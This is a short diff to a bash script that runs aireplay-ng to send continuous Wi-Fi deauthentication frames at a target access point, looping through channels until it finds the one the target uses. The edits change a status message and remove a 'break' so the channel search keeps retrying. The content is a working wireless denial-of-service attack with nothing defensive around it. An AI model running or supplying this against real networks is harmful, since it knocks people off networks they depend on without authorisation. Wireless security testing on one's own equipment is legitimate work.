@@ -41,7 +41,7 @@ BSSID_CHA_DEAUTH=$(aireplay-ng -0 0 -a  $2  $1 -j | cut -d " " -f11 | head -n 1 
 
 sleep 5 
 
-echo "[*] Checking channels " 
+echo " -------------- Checking channels -------------- " 
 
 while true  ; 
 do 
@@ -49,7 +49,6 @@ do
 		BSSID_CHA_DEAUTH=$(aireplay-ng -0 0 -a  $2 $1 -j | cut -d " " -f11 | head -n 1 ) 
 		echo "[-] Not the Same channel : $BSSID_CHA != $BSSID_CHA_DEAUTH ... Trying other channels " 
 		sleep 1 
-		break 
 	else 
 		aireplay-ng -0 0 -a  $2  $1  
 		echo "[+] Channel Found \n" 
